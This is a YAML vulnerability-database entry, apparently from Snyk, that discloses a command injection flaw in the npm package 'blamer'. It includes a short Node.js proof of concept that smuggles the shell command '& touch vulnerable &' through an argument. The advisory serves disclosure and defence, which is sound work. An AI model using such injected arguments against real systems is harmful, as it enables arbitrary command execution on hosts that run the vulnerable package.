- id: snykio:npm:blamer:559541
  title: Command Injection
  description: |
    [blamer][1] is a tool for get information about author of code from
    version control system. Supports git and subversion.

    Affected versions of this package are vulnerable to Command Injection.
    It is possible to inject arbitrary commands as part of the arguments
    provided to blamer.

    ### PoC   {#poc}

        var Root = require("blamer");
        var attack_command = "& touch vulnerable &";
        root = new Root('git',attack_command);
        root.blameByFile("./");



    [1]: https://www.npmjs.com/package/blamer
